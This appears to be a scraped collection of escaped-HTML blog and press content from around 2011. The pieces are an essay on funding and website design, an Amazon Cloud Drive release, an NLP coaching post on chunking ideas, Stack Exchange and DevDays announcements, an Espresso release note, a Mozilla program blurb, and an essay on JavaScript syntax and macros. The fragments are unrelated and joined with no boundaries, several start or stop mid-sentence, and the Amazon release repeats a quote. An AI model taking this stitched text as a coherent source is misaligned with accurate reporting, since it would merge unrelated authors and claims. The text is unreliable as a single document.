it’s the single best way of figuring out <em>how</em> to qualify your “yes.” Examples:</p>\n<ul>\n<li>“Yes” if it pays for an entire additional person.</li>\n<li>“Yes” if this extends the runway of our startup by at least three months.</li>\n<li>“Yes” if it completely funds development we’d like to do anyway.</li>\n<li>“Yes” if it means one of the co-founders can quit her day-job.</li>\n<li>“Yes” if it will completely pay for three new marketing efforts.</li>\n</ul>\n<p>Think of it like another form of funding. <strong>Funding is always a  distraction from actually running your business, so the amount of money  you get must be transformative to the business.</strong> Each of those bullet points<em> are</em> transformative, in that each has the potential to move your company from “hobby” to “real business.”</p>\n<p>And if they say “no,” you’re fine with that, because it would have been a distraction which wouldn’t have moved the needle.</p>\n<p>Let’s continue the discussion in the comments.</p>\n<div><em>This essay was originally posted on April 25, 2011 on Jason’s blog, <a href=\"http://blog.asmartbear.com/\">A Smart Bear</a>.</em></div>\n<div><em><br>\n</em></div>\n<p><em>Jason Cohen founded Smart Bear Software, maker of Code                 Collaborator, a tool for peer code review and recent winner of the     Jolt             Award.

I was embarrassed when referring you guys  to friends.”</p>\n<p>But hold on. <strong>They were still customers. And they still were referring us to friends.</strong> So I wonder, did it <em>really</em> matter?</p>\n<p>Modern Lean Startup theory blares out from the red-tiled rooftops of Stanford: <em>Seek the Data and Ye Shall Find!</em></p>\n<p>First the bounce-rate. If our website design was repulsive — literally — the bounce rate should now diminish. Here’s the data:</p>\n<p style=\"text-align:center\"><img style=\"border:0pt none\" src=\"http://asmartbear.wpengine.netdna-cdn.com/wp-content/uploads/2011/06/WPE-GA-Bounce-Rate.png\" border=\"0\" alt=\"WPE GA Bounce Rate\" width=\"494\" height=\"107\"></p>\n<p>Can you see at what point in time we changed design?  No?  Must not have made a difference.</p>\n<p>Let’s look at time-on-site:</p>\n<p style=\"text-align:center\"><img style=\"border:0pt none\" src=\"http://asmartbear.wpengine.netdna-cdn.com/wp-content/uploads/2011/06/WPE-GA-TimeOnSite.png\" border=\"0\" alt=\"WPE GA TimeOnSite\" width=\"484\" height=\"106\"></p>\n<p>Nothing.</p>\n<p>But this is all superficial — what <strong>Really Matters</strong> is the <strong>Conversion Rate</strong>: are more or fewer people signing up each week:</p>\n<p style=\"text-align:center\"><img style=\"border:0pt none\" src=\"http://asmartbear.wpengine.netdna-cdn.com/wp-content/uploads/2011/06/WPE-GA-Conv-Rate.png\" border=\"0\" alt=\"WPE GA Conv Rate\" width=\"490\" height=\"107\"></p>\n<p>Hmm. <strong>Looks like everything objective is saying “it doesn’t matter.”</strong></p>\n<p>But as much as I respect and follow Lean Startup theory, objective  measurements aren’t the only things that matter. Those customer emails  matter too.</p>\n<p>Maybe the most interesting change was in our own team. I heard things like “I’m <em>soooo</em> glad we fixed the site. I was really embarrassed by it.” That matters.</p>\n<p>The other day we landed a large customer who said they could tell  from our website that among our competitors we’re more mature and ready  to handle a bigger customer like them. I can tell you — objectively —  that we’re among the youngest of our competitors, and although I have a  list of reasons why “we’re better,” the truth is that particular  customer would probably be served just fine by several of those  competitors. Was it the design that gave us that edge? Could be. Didn’t  hurt, anyway.</p>\n<p>Still, the more I look at the importance of design in the startups in my little career, the <strong>less it seems to matter</strong>. I’ve chronicled the <a href=\"http://blog.asmartbear.com/your-idea-sucks-now-go-do-it-anyway.html\">eye-melting design work</a> that punished potential customers in the evolution of the Smart Bear  website, and yet with all that cringe-worthyness, here is a company that  doubled in revenue <em>and profit</em> like clockwork for half a decade — a stat any startup would be proud to match. <strong>It doesn’t prove design doesn’t matter, but it does suggest design may not be the deciding factor.</strong></p>\n<p>An even more extreme example comes from my second company <a href=\"http://itwatchdogs.com/\">ITWatchDogs</a>. I displayed its old homepage at the magnificent <a href=\"http://www.webstock.org.nz/\">Webstock design conference</a> in Wellington earlier this year; the crowd whooped at our violent  assault on the visual arts, complete with calliope menubar colors, two  broken images tag above the fold, and a layout model that could be seen  as a “grid” only after consuming a pillowcase of mushrooms:</p>\n<p style=\"text-align:center\"><img style=\"border:0pt none\" src=\"http://asmartbear.wpengine.netdna-cdn.com/wp-content/uploads/2011/06/ITW-Homepage.png\" border=\"0\" alt=\"ITW Homepage\" width=\"500\" height=\"293\"></p>\n<p>But you’re anticipating the punch-line — ITWatchDogs grew every  month, made millions of dollars, stole business from competitors with  billion-dollar market caps (and professional-looking websites), and had a  successful exit.</p>\n<p>Of course it’s only fair to also point out some of the <strong>many instructive counter-examples:</strong></p>\n<ul>\n<li><a href=\"http://www.hipmunk.com/\">Hipmunk</a> is the same thing as Orbitz or Travelocity — the <em>only</em> difference is amazing design, not just because it looks good but because it’s so useable. In the <a href=\"http://www.joelonsoftware.com/uibook/chapters/fog0000000060.html\">words of Joel Spoksly</a> — the design “affords usability.” (P.S. Early Hipmunk team member <a href=\"http://alexisohanian.com/\">Alexis Ohanian</a> is so cool and smart and rich and funny and successful and good-looking  that really he doesn’t deserve to be alive. (P.P.S. Hey flamers, for  God’s sake it’s a <em>joke! </em>Don’t you realize I’m just sore from <a href=\"http://blog.asmartbear.com/agile-marketing-the-movie.html\">losing the Pecha Kucha competition</a> to him?))</li>\n<li>I always use and recommend Amy Hoy’s <a href=\"http://everytimezone.com/\">time zone tool</a> <em>only</em> because it’s <em>just nice to use and look at</em>. (P.S. she also authors a terrific <a href=\"http://unicornfree.com/\">blog aimed at the solo entrepreneur</a>.)</li>\n<li>Many people credit Mint’s smash success with their terrific design.  Considering how many features were broken for how long, it’s hard to  argue.</li>\n<li>37signals documented — <a href=\"http://37signals.com/svn/posts/1525-writing-decisions-headline-tests-on-the-highrise-signup-page\">with data</a> — how design changes results directly in more credit-card-swiping customers. It doesn’t get more “business value” than that.</li>\n</ul>\n<p>So where does that leave us in the “matters / doesn’t matter” question of design?</p>\n<p>I think you can go either way, but you must <strong>decide whether or not you’re going to value design as core to your startup’s identity</strong><strong>, and then act consistently.</strong> Here’s what I mean.</p>\n<p>It’s clear from the outset that design is the <em>only competitive advantage</em> Hipmunk has over its competition. Specifically, by making the  flight-search problem pleasurable and useable instead of feeling like  you’re navigating pivot tables from Excel ’98. They don’t have better  data, better branding, better name, better SEO, or more money. Just  better design, and not just easily-copyable incremental improvement, but  a quantum leap better.</p>\n<p>When design is that fundamental to the business — how it acquires and  retains customers, garners attention and referrals, and distinguishes  itself in the market — obviously design can be the most important thing.</p>\n<p>Conversely, at ITWatchDogs the company’s internal and external  culture was that we’re low-cost, friendly, approachable, regular guys,  who understand exactly what you worry about, exactly what your budget  is, and we nail it. The site might have <em>looked bad</em>, but our message couldn’t have been clearer.</p>\n<p>In fact, all our competitors had these slick, corporate-looking  sites, whereas the indifferent chaos of our website was not unlike our  customers’ offices which themselves were littered with assorted hardware  corpses and solder stains. (And I don’t buy the typical retort that  “that’s design too,” because no designer on Earth would have put her  name to that website in the name of looking “relatable.”)</p>\n<p>Neither is it an absolute either-or whether design is important; WP  Engine is a good example of this. We did fine before the redesign and  we’re doing fine after it; I’m glad we did it, if not for objective data  than for subjective feelings.</p>\n<p>But it is useful to <strong>decide where you come down on the question of design</strong> in your startup, because if it’s important you’d better work on that right now and <strong>develop a consistent culture</strong> of valuing design through-and-through, and if it’s not important you’d better decide what <em>is</em> important and <strong>nail those things all the harder</strong>,  because you’ll be competing with people who are using superior design  to cover up their lack of competency in those same areas.</p>\n<div><em>This essay was originally posted on June 13, 2011 on Jason’s blog, <a href=\"http://blog.asmartbear.com/\">A Smart Bear</a>.</em></div>\n<div><em><br>\n</em></div>\n<p><em>Jason Cohen founded Smart Bear Software, maker of Code                  Collaborator, a tool for peer code review and recent winner of the      Jolt             Award.

(NASDAQ: AMZN) today announced three enhancements to Amazon Cloud Drive and Cloud Player: storage plans that include unlimited space for music, free storage for all Amazon MP3 purchases and Cloud Player for Web, now on iPad.</em></p>\n<p><em>“Additionally, we are adding free storage for all MP3s purchased from Amazon MP3, and support for the iPad. Our customers love Cloud Drive and Cloud Player and we’re excited to innovate these services on their behalf.”</em><br>\n<em>“Customers are already enjoying Cloud Drive and Cloud Player and now for just $20 a year, customers can get unlimited space for music,” said Craig Pape Director of Amazon Music. “Additionally, we are adding free storage for all MP3s purchased from Amazon MP3, and support for the iPad. Our customers love Cloud Drive and Cloud Player and we’re excited to innovate these services on their behalf.”</em></p>\n<p><em>Unlimited Space for Music</em></p>\n<p><em>Now, for a limited time, Amazon customers who purchase a Cloud Drive storage plan will receive unlimited space for their MP3 and AAC (.m4a) music files. This offer is available for even the lowest price plan: $20/year for 20 GB of file storage plus unlimited space for music. Customers can visit (www.amazon.com/clouddrive/manage) to purchase a Cloud Drive storage plan and receive unlimited space for music.</em></p>\n<p><em>Store all Amazon MP3 Purchases for Free</em></p>\n<p><em>Customers can now store all of their Amazon MP3 purchases for free in Cloud Drive, including future MP3 purchases as well as all purchases made before the launch of Cloud Drive and Cloud Player. MP3s purchased from Amazon MP3 and stored in Amazon Cloud Drive will not count against a customer’s storage quota.</em></p>\n<p><em>Cloud Player for Web on iPad</em></p>\n<p><em>Also new, Cloud Player for Web on iPad. Cloud Player, combined with unlimited space for music in Cloud Drive, enables customers to play music stored in the cloud on any Android phone, Android tablet, Mac, PC, and now on their iPad. Cloud Player for Web has been optimized to offer customers streaming playback of their Cloud Drive music using the Safari browser for iPad. To access Cloud Player for iPad, customers simply open their Safari browser and visit (www.amazon.com/cloudplayer) to start listening to their music.</em></p>\n<p><em>Storage for Music and More</em></p>\n<p><em>All customers automatically start with 5 GB of free Cloud Drive storage to begin uploading their digital music library, and for a limited time, those who purchase any Cloud Drive storage plan will receive unlimited space for music at no additional cost. In addition to unlimited space for music, Cloud Drive allows customers to upload and store all kinds of digital files, including photos, videos and documents which are stored securely and available via web browser on any computer. Customers who qualified for 20 GB of free storage from earlier promotions will receive the unlimited space for music at no additional cost.</em></p>\n<p><em>In March, Amazon launched Cloud Drive (www.amazon.com/clouddrive), Amazon Cloud Player for Web (www.amazon.com/cloudplayer), and Amazon Cloud Player for Android (www.amazon.com/cloudplayerandroid).</em></p>\n<p><em>Together, these services enable customers to securely store music in the cloud and play it on any Android phone, Android tablet, Mac or PC, and now iPad, wherever they are.

Do you want to know how to resolve disputes like a professional negotiator? Have you ever wondered why some people are easy to talk to while with others it just seems to be disagreement after disagreement? Would you like to know what most coaches do wrong, that if they did it right, would totally transform their clients? Then you need to know about the NLP Hierarchy of Ideas.</p>\n<div style=\"float:right\"><img src=\"http://www.confidentfuture.com.au/wp-content/uploads/2011/07/Cute-Koala-2.jpg\" alt=\"\" width=\"210\" height=\"264\"></div>\n<p>The NLP Hierarchy of Ideas is an approach to thinking that allows you to increase your flexibility of thought. It is based on the premise that every idea exists somewhere on a broader hierarchy of ideas. At one extreme you have ideas that are very vague and abstract in nature. While on the other extreme you have ideas that are incredibly specific and exact. But this isn’t a binary spectrum with just one extreme or the other, there are almost unlimited ideas in between those two extremes and because of that you are able to take almost any concept and start thinking about it in this way. Moving through the Hierarchy of Ideas is done using either the process of Chunking Up or Chunking Down.</p>\n<p>Before we go any further though we are going to need an example. So imagine if we were to take a fairly simple idea – let’s say the idea of a ‘koala’. Now allow me to demonstrate how this can work:</p>\n<p><strong>Chunking Up</strong><br>\nThe process of Chunking Up is when you move from one idea and begin to move away from that idea and towards more vague and abstract. The way to do this is to ask these questions:<br>\n<em>What is this an example of?</em> OR<br>\n<em>For what purpose?</em><br>\nSo to work with the example of an koala we could ask either of these questions and we would move to a more vague or abstract idea. Here are some possible responses that are all examples of Chunking Up on the idea of a koala:<br>\n<em>What is this an example of?</em> Marsupial<br>\n<em>For what purpose?</em> Tourist Attraction<br>\n<em>What is this an example of?</em> Animal<br>\n<strong>Note:</strong> There will *always* be more than one answer and no answer is right or wrong.</p>\n<p><strong>Chunking Down</strong><br>\nThe process of Chunking Down is when you move from one idea and begin to move away from that idea and towards more specific and exact details. The way to do this is to ask these questions:<br>\n<em>What is an example of this?</em> OR<br>\n<em>For instance?</em><br>\nSo to work with the example of an koala we could ask either of these questions and we would move to a more specific and exact idea. Here are some possible responses that are all examples of Chunking Down on the idea of a koala:<br>\n<em>What is an example of this?</em> A koala at the local zoo<br>\n<em>For instance?</em> A koala plush toy<br>\n<strong>Note:</strong> There will *always* be more than one answer and no answer is right or wrong.</p>\n<p><strong>Chunking Laterally</strong><br>\nNow that you understand how to Chunk Up and Chunk Down you can also begin to Chunk Laterally. How do you do this? It is really straight forward:</p>\n<ol>\n<li>Chunk Up</li>\n<li>Chunk Down</li>\n</ol>\n<p>Congratulations, you’ve now Chunked Laterally!</p>\n<p><strong>Putting the Hierarchy of Ideas to Use</strong><br>\nHaving read this now you are probably wondering <em>how</em> this relates to what I talked about at the beginning? Increasing your earning power comes down to your ability to think up and down the Hierarchy of Ideas easily and effortlessly. The faster you can do this the better you become at what business people call ‘<em>Thinking Outside of the Box</em>‘. When you think about what a Board of a large organisation talks about they are discussing trends in the market, changes in the economy and abstract ideas like consumer demand – these ideas are all waaaaaay up on the Hierarchy of Ideas. If you cannot get your mind out of the nitty gritty of the specifics then it is not going to be easy for you to think strategically. On the flip side if you spend your whole time thinking up in the clouds then you won’t be very useful either. True business leaders have the flexibility of thinking to climb up and down the hierarchy on demand.</p>\n<p>Resolving disputes also becomes easier when you understand the hierarchy of ideas. When you chunk up to broader ideas it becomes easier and easier to create agreement. Very few people disagree about ‘World Peace’ being important but there can be a lot of disagreement when you get into the specifics about how ‘World Peace’ is to be achieved. The trick with using this for negotiations is to Chunk Up until you reach agreement and then Chunk Down only as quickly as you can maintain that agreement. This technique is surprisingly simple so give it a go and enjoy the results.</p>\n<p>And as for what most coaches do wrong…  To find that one out you will need to attend our next Confident Future NLP Practitioner Training.

For example, when I ran into a nasty issue with Java exploits in Google Chrome when browsing for images, I <a href=\"http://superuser.com/questions/201613/disable-java-plugin-in-google-chrome\">documented that on Super User by asking and answering my own question</a>. Now, others can benefit from my misfortune — and best of all, I got new even better answers beyond what I offered!

That way, the next person who has the problem won’t have to slog through so much misinformation.  I might even learn some more about the various issues that plagued us if other experts chime in with their own knowledge.\n</p></blockquote>\n<p>Bottom line — <b>never hesitate to ask and answer your own question on any Stack Exchange site.</b> Please do! It’s all part of our shared mission to make the internet better.</p>"

We are extremely excited to finally be able to show you what we have been working on, as this release will be of interest to both CSSEdit and Espresso users.\n</p>\n<p>\nWith mixed feelings toward our loyal and awesome friend, we bid adieu to CSSEdit as a standalone application. That’s right: CSSEdit 3 is a tightly integrated part of Espresso, bringing the best features of CSSEdit’s tools and previews to Espresso, and likewise introducing the flexibility and power of Espresso’s publishing system, editors, themes, and more to our CSSEdit users.\n</p>\n<p>\nWas CSSEdit’s transformation the only reason for the long wait? No. Long story short, we bit off more than we could chew. In addition to a completely re-architected publishing engine, we improved and significantly future-proofed many aspects of Espresso. Instead of ruthlessly limiting the scope of the new version, we allowed the schedule to spiral out of control. In the future we will try to trade some of our traditional “splash releases” for more regular incremental improvements.\n</p>\n<p style=\"text-align:center;margin-top:40px;margin-bottom:30px\">\n<img src=\"http://macrabbit.com/espresso/images/EspressoTwoKaboom.gif\">\n</p>\n<p>\nEspresso 2 is not quite as polished as we would like yet. At the same time, we think the included improvements outweigh the remaining rough edges for most users, and since many of you have reminded us that you are eagerly awaiting it we’ve decided to release a public Kaboom. Visit <a href=\"http://macrabbit.com/espresso/2\">macrabbit.com/espresso/2</a> for all the details on our plans for Espresso 2, the Mac App Store, and to help us test and refine the final release. Thank you for listening, and we hope you enjoy the new Espresso!</p>"

See the <a href=\"http://blog.stackoverflow.com/2011/09/devdays-2011-is-cancelled/\">announcement</a> on the Stack Exchange Blog for details.]</p>\n<p><a href=\"http://devdays.stackoverflow.com/\">Stack Overflow DevDays</a>, the universe's best conference series for coders, is back, and it's bigger than ever!\n</p>\n<p>Here's the idea behind DevDays. You're a developer. You'd love to learn all the latest <a href=\"http://meta.stackoverflow.com/questions/88052/what-topics-would-you-like-to-learn-at-devdays-2011\">hot new technologies</a>. Things like DVCS, HTML 5, Node.js, CSS3, Hadoop, etc. The stuff the cool kids are all talking about on the playground while you're stuck in the basement somewhere grinding away on Java Enterprise Visual Basic.\n</p>\n<p>\nThe idea behind DevDays is a fast, high-bandwidth, fire hose tutorial on at least ten interesting concepts. We'll assume that you're a developer, you know what a loop is, but each tutorial starts at the ground level and gives you a whirlwind tour through a technology by showing you actual code. Every presenter launches an editor and writes code from scratch and shows you what it does. There are almost no prepared PowerPoint slides with ten bullet items each containing 10 words explaining the ROI benefits of some new technology. There are not even any PowerPoint slides with cats and pandas doing hilarious things, such as this one:\n</p>\n<p>\n<a href=\"http://icanhascheezburger.com/2007/09/25/screw-dis-no-wants/?utm_source=embed&amp;utm_medium=web&amp;utm_campaign=sharewidget\"><img src=\"http://icanhascheezburger.wordpress.com/files/2007/09/128339897745781250screwdisno.jpg\"></a>\n</p>\n<p>\nYes, DevDays contains precisely NO funny pictures of cats. We might have Jon Skeet with a sock puppet, though:\n</p>\n<iframe height=\"281\" src=\"http://player.vimeo.com/video/7403673?title=0&amp;byline=0&amp;portrait=0\" frameborder=\"0\" width=\"500\"></iframe>\n<p>\n(That was <a href=\"http://vimeo.com/7403673\">Jon Skeet and Tony the Pony</a> from London DevDays 2009.)\n</p>\n<p>\nWhat we have instead is some great presenters from the community who will write code and compile code and explain it all while you watch, and you'll come away knowing enough about each new technology to know what it's good for, what it's not so good at, how to do the basics, and how to learn more. Bottom line: it's the best possible way to spend two days and learn as much as you would learn in two <em>years</em> of reading Twitter.\n</p>\n<p>\nWe have FOUR, yes FOUR different DevDays conferences coming up this fall. Each one is its own production, and they're all going to be spectacular. If you came to DevDays last time, prepare to get blown away. This time everything is DOUBLE. Two days instead of one. Better food and coffee. Better locations. Bigger screens to make it easier to follow along. <a href=\"http://devdays.stackoverflow.com/\"><img title=\"DevDaysSydney2011\" alt=\"Sydney DevDays 2011\" align=\"right\" src=\"http://blog.stackoverflow.com/wp-content/uploads/DevDaysSydney2011.png\" width=\"252\" height=\"61\"></a>Lots of social activities. And, for the first time ever, we'll be visiting one city in Australia <em>(shown at right)</em>, for an antipodean increase of <em>infinity percent</em>.\n</p>\n<p>\nAnyway, registration is now open. The schedule is:\n</p>\n<ul>\n<li>October 12-13 <a href=\"http://devdays.stackoverflow.com/san-francisco/\">San Francisco</a></li>\n<li>October 25-26 <a href=\"http://devdays.stackoverflow.com/sydney/\">Sydney</a></li>\n<li>November 14-15 <a href=\"http://devdays.stackoverflow.com/london/\">London</a></li>\n<li>December 15-16 <a href=\"http://devdays.stackoverflow.com/washington-dc/\">Washington, DC</a></li>\n</ul>\n<p>\nThere are two! special! bonuses! you should know about before you choose a city:\n</p>\n<ol>\n<li>In San Francisco, the day after the conference (October 14), Server Fault is holding a one-day High Scalability conference. You may want to go to both for a full three days of amazing amazingness... if you think your heart can handle the excitement.</li>\n<li>In Washington, the day before the conference (December 14), we're have a big open source hackathon. The entire Stack Exchange dev team will be on hand and it'll be a lot of fun.</li>\n</ol>\n<p>\nSo, go, <a href=\"http://devdays.stackoverflow.com/\">sign up now</a>.

We are creating a workshop environment where bold ideas can be realized  and bare-bones prototypes can develop and go forward as products.</p>\n<h3>How</h3>\n<p>We’ll host small teams at Mozilla’s global offices for four weeks at a time, giving them access to our people, tools and resources, so they can focus on building. We’re looking for playful, useful, original problem-solving applications and tools that make the Web a better place.</p>\n<p>During the four week program, teams will work in-house alongside the Mozilla crew. You’ll receive mentorship and guidance from some of the brightest people around, allowing you to focus on bringing your product idea to life.</p>\n<p>At the end of four weeks, you’ll have a minimum viable product ready to go out on the Open Web.

Harry also explains why this might leave a sour aftertaste in the user’s experience:</p>\n\n<blockquote><p>If you hover or act on something in a positive way (giving it attention, wanting to perform something), you would expect that to respond in a positive way, right? If you want to click a link that will, say, take you to another page, you don’t want that link to ‘shy away’ from you, do you? It feels more intuitive that that link would ‘stand forward’ and act positively, becoming more-than-it-was as soon as you focus your attention upon it.

      "content" : "<p>For 16 years, JavaScript has been the language of the web browser. This language has enabled the building of compelling web applications and contributed to the success of the web. Other scripting languages could have filled the role JavaScript does but JavaScript was in the right place at the right time. Microsoft added Basic to Internet Explorer a long time ago but JavaScript was the language in all the browsers and so it won. Since JavaScript has been cross-browser and at least good enough, the browser makers have not needed to add other language interpreters to the browsers themselves.</p>\n\n<p>But we still didn’t choose to use JavaScript. It has been the one option. It has powerful features like closures and we learned to love these features while turning a blind eye to the warty parts of the language. There has even been a lot of apologizing to the programming community along the lines of “Yes we know it is a pretty funky language but please give it a chance. I’m sure you’ll learn to love it.” It shouldn’t be that hard to sell the quality of the language. JavaScript has been described as an experiment that escaped the lab a little too early and we’ve been stuck with the warts ever since.</p>\n\n<p>Still, JavaScript has been a great language. In 2007, Steve Yegge declared JavaScript as <a href=\"http://steve-yegge.blogspot.com/2007/02/next-big-language.html\">The Next Big Language</a> and it has been. Between then and now JavaScript-based web-applications have become bigger and better. With JavaScript’s help, the web has continued to flourish even with the threat of native mobile apps taking over the same space.</p>\n\n<p>In very recent times, JavaScript has been making its most successful attempt at being a server-side language. The Node.js platform, with its non-blocking I/O, may be solving a problem that programmers have needed solved for a long time. JavaScript is the language for Node.js and so JavaScript may go along for the ride to become a successful server-side language after many failed attempts in the past.</p>\n\n<p>Overall, JavaScript has been a wild success. The most popular programming language in the world. But if the browser died today, how much new JavaScript code would be written tomorrow? Most likely JavaScript would become a fringe language overnight. But the browser isn’t dying tomorrow. We will be programming for it for years to come.</p>\n\n<p>As JavaScript has been used for more and larger programs, the warts of the language have become more apparent and caused increasing amounts of grief for many developers. It may come as a surprise that even though I’ve written about JavaScript for years, I’m not a JavaScript fanboy. Most of my JavaScript articles have been about me working through the difficulties of finding a peaceful coexistence with the language. Yes I’ve enjoyed programming in JavaScript and have learned a lot but there certainly have been times when I’ve felt like I’m wallowing in the muck.</p>\n\n<p>One of the most obvious deficiencies in JavaScript is with its user interface: its syntax. The inability to quickly improve its syntax has lead to the language’s downfall.</p>\n\n\n<h2>The Case for Syntax Extensions: Verbose Idioms</h2>\n\n<p>Here we look at just four of the many examples where JavaScript’s syntax could be improved to remove verbose idioms from our daily programming existences.</p>\n\n\n<h3>Optional Parameters and Default Values</h3>\n\n<p>JavaScript functions can be called with a variable number of actual parameters. This makes some of the formal parameters in the function’s declaration optional. Often times these optional parameters must be set to a default value if no actual parameter is supplied. I’m willing to bet you’ve written and seen plenty of code like the following.</p>\n\n<pre><code>function(a, b, option) {\n    option = option || {};\n    // ...\n}</code></pre>\n\n<p>I have and still write code like this. This code is wrong. If a falsy value is passed to the function for <code>option</code> then the wrong thing happens. We should be writing the following.</p>\n\n<pre><code>function(a, b, option) {\n    option = arguments.length &gt; 2 ? option : {};\n    // ...\n}</code></pre>\n\n<p>Although this code expresses the intended thought of setting a default value if an actual parameter for <code>option</code> is not supplied, it is too verbose and less readable. The reader must count to determine which variable is has index 2. Beyond the awkwardness, the correct version is more difficult to maintain. It is easy to produce the following buggy code if the <code>b</code> parameter is removed.</p>\n\n<pre><code>function(a, option) {\n    option = arguments.length &gt; 2 ? option : {};\n    // ...\n}</code></pre>\n\n<p>If your application uses optional parameters with default values, some new syntax would be beneficial for you.</p>\n\n<pre><code>function(a, b, option = {}) {\n    // ...\n}</code></pre>\n\n<p>The addition of this new syntax tunes the language better to your application’s needs.</p>\n\n\n<h3>Let</h3>\n\n<p>Does the following buggy code look familiar?</p>\n\n<pre><code>for (var i=0, ilen=elements.length; i&lt;ilen; i++) {\n    var element = elements[i];\n    LIB_addEventListener(element, &#39;click&#39;, function(event) {\n        alert(&#39;I was originally number &#39; + i);\n    });\n}</code></pre>\n\n<p>All the elements were the same number?! The solution is to use an immediately evaluated function expression so each alert reports a different number. This is the “let” idiom after Lisp’s various <code>let</code> forms.</p>\n\n<pre><code>for (var i=0, ilen=elements.length; i&lt;ilen; i++) {\n    var element = elements[i];\n    (function(num) {\n        LIB_addEventListener(element, &#39;click&#39;, function(event) {\n            alert(&#39;I was originally number &#39; + num);\n        });\n    }(i));\n}</code></pre>\n\n<p>Sure sometimes delegate listeners might be better than the above code but sometimes the above code is the desired idea. In the above case, we are trying to bind the order of the elements when the loop runs. This order could be lost with the delegate pattern if the elements are rearranged in the DOM.</p>\n\n<p>This syntax is particularly awkward because of the distance between the formal <code>num</code> and actual <code>i</code> parameters of the immediate function.</p>\n\n<p>The immediate function could be factored out to another location and called inside the loop.</p>\n    \n<pre><code>function attachListener(element, num) {\n    LIB_addEventListener(element, &#39;click&#39;, function(event) {\n        alert(&#39;I was originally number &#39; + num);\n    });\n}\nfor (var i=0, ilen=elements.length; i&lt;ilen; i++) {\n    attachListener(elements[i], i);\n}</code></pre>\n   \n<p>Even with this option, sometimes programmers still use the immediate function because it conveys better their intended message to readers.</p>  \n \n<p>If your application uses the let idiom, wouldn’t it be nice to have new syntax for it?</p>\n\n<pre><code>for (var i=0, ilen=elements.length; i&lt;ilen; i++) {\n    var element = elements[i];\n    let (num = i) {\n        LIB_addEventListener(element, function(event) {\n            alert(&#39;I was originally number &#39; + num);\n        });\n    };\n}</code></pre>\n\n<p>With <code>num</code> and <code>i</code> together it is much easier to read this code and a new scope containing <code>new</code> has been introduced so the closure works properly. Once again, the addition of new syntax can tune the language better to your application’s needs.</p>\n\n\n<h3>Modules</h3>\n\n<p>One of the most common idioms in JavaScript programs we all know and love is usually called “the module pattern.” This idiom provides the benefits of encapsulated variables that are private to the module and imparts sanity to our code.</p>\n\n<pre><code>var event = (function() {\n\n    // private variables\n    var listeners = [];\n   \n    function addEventListener(f) {\n        listeners.push(f);\n    }\n\n    function clearEventListeners() {\n        listeners = [];\n    }\n    \n    // ...\n    \n    // export the module's API\n    return {\n        addEventListener: addEventListener,\n        clearEventListeners: clearEventListeners\n        // ...\n    };\n}());</code></pre>\n\n<p>The goal of encapsulation here isn’t security. It is to ensure that other developers keep their dirty, monkey-patching hands off your module’s data.</p>\n\n<p>The exporting can be done a few ways but no matter which way there is some boiler plate.</p>\n\n<p>Importing is verbose also</p>\n\n<pre><code>(function() {\n\n    // import desired properties of the event module\n    var addEventListener = event.addEventListener;\n    var clearEventListeners = event.clearEventListeners;\n    \n    // ...\n}());</code></pre>\n\n<p>Some new syntax would be nice to convey the intent of the module pattern better.</p>\n\n<pre><code>module event {\n    \n    // private variables\n    var listeners = [];\n   \n    export function addEventListener(f) {\n        listeners.push(f);\n    }\n\n    export function clearEventListeners() {\n        listeners = [];\n    }\n    \n    // ...\n}</code></pre>\n\n<pre><code>(function() {\n\n    import event;\n    \n    // ...\n}());</code></pre>\n\n<p>The module pattern is almost everywhere and some new syntax to better express this idiom would better tune the language to all of our applications.</p>\n\n\n<h3>Inheritance</h3>\n\n<p>These idiom examples have been growing in how they each span an increasing number of lines of code. The JavaScript idiom that potentially spans the most lines of your program may be the inheritance idiom.</p>\n\n<pre><code>function Employee(first, last, position) {\n    // call the superclass constructor\n    Person.call(this, first, last);\n    this.position = position;\n};\n// inherit from Person\nEmployee.prototype = Object.create(Person.prototype);\nEmployee.prototype.constructor = Employee;\n\n// define an overridding toString() method\nEmployee.prototype.toString = function() {\n    // call superclass's overridden toString() method\n    return Person.prototype.toString.call(this) +\n           ' is a ' + this.position;\n};</code></pre>\n\n<p>What a mess. Yes JavaScript makes single inheritance like this possible by linking prototypes but it takes a lot of code to manually make super things happen they way you might like inheritance to work.</p>\n\n<p>If there could be a maintenance nightmare that is it. The strings “Person” and “Employee” are sprawled throughout the code for the Employee “class”.</p>\n\n<p>If classes with inheritance are a big part of your application, some syntax would really help clean up the code. Perhaps something like the following.</p>\n\n<pre><code>class Employee extends Person {\n    constructor(first, last, position) {\n        super(first, last);\n        public position = position;\n    }\n \n    update(camera) {\n        return super.update() + ' is a ' + position;\n    }\n}</code></pre>\n\n<p>That is a major improvement.</p>\n\n\n<h3>Learning from Idioms</h3>\n\n<p>These common idioms make it clear that JavaScript could use some new syntax for several reasons. The ability to do what we want is usually in JavaScript somewhere. The verbosity of the idioms is sometimes too much. We cut corners. Sometimes we avoid certain algorithms because the idioms are too verbose. The idioms are not self explanatory. They are inside secrets of the community and the intent is not easily recognized by outsiders.</p>\n\n<p>The ECMAScript committee has recognized that the above idioms, and others idioms, are common across a wide variety of applications. There are proposals for all of these syntax cases in Harmony. Some of them may make it into the next version of ECMAScript and into the browsers for your use. If new syntax gets there eventually then you can use use it.</p>\n\n<p>Idioms may have emerged in <em>your</em> application that do not appear in a wide variety of applications. For example, Node.js’s non-blocking I/O and heavy reliance on callbacks will undoubtedly result in idioms that do not appear in browser scripts. Syntax specific to just your applications will likely never make it into ECMAScript.</p>\n\n<p>If you would like to use specialized syntax for the general idioms like those shown above or you would like syntax for your own idioms, what can you do?</p>\n\n\n<h2>If Only We Had Macros</h2>\n\n<p>Lisp languages have had full-blown macros for decades. Through macros, Lisp gives programmers the ability to tune the language’s syntax to best match their own applications. Because of its macros, Lisp has been described as “the programmable programming language.” Powerful stuff.</p>\n\n<p>Lisp’s s-expression syntax, you know, the syntax with all those parens, gives the language a special property called homoiconicity. It roughly means the syntax of the language is also the syntax of its data structures or that a program’s parse tree uses the languages data structures. This homoiconicity makes Lisp’s macros possible.</p>\n\n<p>JavaScript doesn’t have macros. A major reason for this is that adding macros to languages with C-like syntax, languages that are not homoiconic, is still a research topic. Excerpts from a short conversation on Twitter with littlecalculist, Dave Herman, Ph.D., ECMAScript committee member, and Mozilla Researcher:</p>\n\n<blockquote>\n    <dl>\n        <dt>@petermichaux</dt>\n        <dd>I believe @littlecalculist knows more about the research and possibilities for macros in ECMAScript. I’d like to know more also.</dd>\n        \n        <dt>@littlecalculist<dt>\n        <dd>I have thoughts on it for sure. But macros for non-sexp languages is still very much a challenging research topic</dd>\n\n        <dt>@petermichaux<dt>\n        <dd>[...] We’ll turn blue waiting for macros.</dd>\n\n        